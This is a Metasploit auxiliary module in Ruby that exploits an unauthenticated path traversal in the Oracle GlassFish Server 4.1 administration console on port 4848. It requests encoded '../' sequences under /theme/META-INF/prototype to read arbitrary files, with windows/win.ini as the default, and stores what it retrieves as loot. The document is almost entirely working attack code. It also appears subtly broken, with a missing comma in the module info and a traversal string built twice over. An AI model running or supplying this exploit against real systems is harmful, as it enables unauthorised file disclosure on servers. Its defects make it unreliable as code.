##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Path Traversal in Oracle GlassFish Server Open Source Edition',
      'Description' => %q{
        This module exploits an unauthenticated directory traversal vulnerability
        which exits in administration console of Oracle GlassFish Server 4.1, which is
        listening by default on port 4848/TCP.
      },
      'References'  =>
        [
          ['EDB', '39441']
        ],
      'Author'      =>
        [
          'Trustwave SpiderLabs', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
      'License'     => MSF_LICENSE
      'DisclosureDate' => "Aug 08 2015"
      ))

  register_options(
      [
        Opt::RPORT(4848),
        OptString.new('FILEPATH', [true, "The path to the file to read", '%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini']),
        OptInt.new('DEPTH', [ true, 'Path Traversal Depth', 10 ])
      ])
  end

    def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = "..%5d" * datastore['DEPTH'] << filename

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/theme/META-INF/prototype#{traversal}"
    })

    if res && res.code == 200
      print_good("#{res.body}")

      path = store_loot(
        'oracle.glassfish',
        'text/plain',
        ip,
        res,
        filename
      )

      print_good("File saved at: #{path}")
    else
      print_error("Nothing was downloaded")
    end
  end
end
